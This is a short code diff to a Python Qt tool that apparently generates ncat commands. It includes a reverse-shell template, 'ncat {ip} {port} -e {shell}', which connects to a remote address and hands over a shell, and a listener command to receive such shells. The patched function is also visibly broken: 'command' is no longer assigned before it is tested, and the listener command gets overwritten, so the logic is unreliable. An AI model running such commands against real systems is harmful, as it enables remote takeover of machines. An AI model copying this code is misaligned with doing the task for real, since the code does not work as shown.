@@ -1280,15 +1280,16 @@ class Window(QMainWindow):
         def generate_command_ncat():
             ip = ip_input.text()
             port = port_input.text()
-            command = shell_input.text()
+            shell = shell_input.text()
             listener = "-l" if listener_yes.isChecked() else ""
 
             if not ip or not port:
                 QMessageBox.warning(dialog, "Input Error", "Please enter both IP address and port.")
                 return ""
-
+            if listener:
+                command = f"ncat -l -v -p {port}"
             if command:
-                command = f"ncat {ip} {port} -e {command}"
+                command = f"ncat {ip} {port} -e {shell}"
             else:
                 command = f"ncat {ip} {port}"
             output_area.setText(command)
